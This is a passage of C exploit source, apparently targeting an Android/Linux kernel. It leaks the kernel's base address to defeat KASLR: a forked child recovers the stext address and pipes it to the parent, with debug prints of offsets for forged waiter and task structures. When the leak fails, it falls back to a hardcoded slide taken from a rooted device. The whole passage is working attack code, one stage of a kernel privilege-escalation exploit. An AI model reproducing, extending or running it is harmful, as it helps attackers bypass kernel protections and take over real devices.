    pr_info("[slide-debug]   FAKE_WAITER_TASK_OFF=0x%x FAKE_WAITER_LOCK_OFF=0x%x\n", FAKE_WAITER_TASK_OFF, FAKE_WAITER_LOCK_OFF);
    pr_info("[slide-debug]   FAKE_TASK_PI_LOCK_OFF=0x%x FAKE_TASK_PI_WAITERS_OFF=0x%x\n", FAKE_TASK_PI_LOCK_OFF, FAKE_TASK_PI_WAITERS_OFF);
    pr_info("[slide-debug]   FAKE_TASK_PI_TOP_TASK_OFF=0x%x FAKE_TASK_TASK_GROUP_OFF=0x%x\n", FAKE_TASK_PI_TOP_TASK_OFF, FAKE_TASK_TASK_GROUP_OFF);
    pr_info("[slide-debug] NFDS=%d\n", SLIDE_PSELECT_NFDS);
    /* ========== END SLIDE DEBUG ========== */

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      slide_crash_log("SLIDE3_CHILD: attempt=%d child pid=%d start leak\n",
                      attempt, getpid());
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        slide_crash_log("SLIDE4_CHILD_OK: attempt=%d stext=0x%llx\n",
                        attempt, (unsigned long long)stext);
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      slide_crash_log("SLIDE4_CHILD_FAIL: attempt=%d no stext\n", attempt);
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    slide_crash_log("SLIDE3_PARENT: attempt=%d child=%d waiting read\n",
                    attempt, child);
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    slide_crash_log("SLIDE5_PARENT: attempt=%d read_n=%zd status=%d stext=0x%llx\n",
                    attempt, n, status, (unsigned long long)stext);
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    fflush(stdout);
    return 1;
  }

  /* All attempts failed — use hardcoded KASLR slide for testing.
   * From rooted violin kallsyms: _text=0xffffffe387200000, slide=0x237f200000 */
  kaslr_base = 0xffffffe387200000ULL;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  pr_warning("slide kaslr leak failed — using HARDCODED slide=0x%llx "
             "(WILL FAIL ON REBOOT!)\n",
             (unsigned long long)kaslr_slide);
  return 1;
}
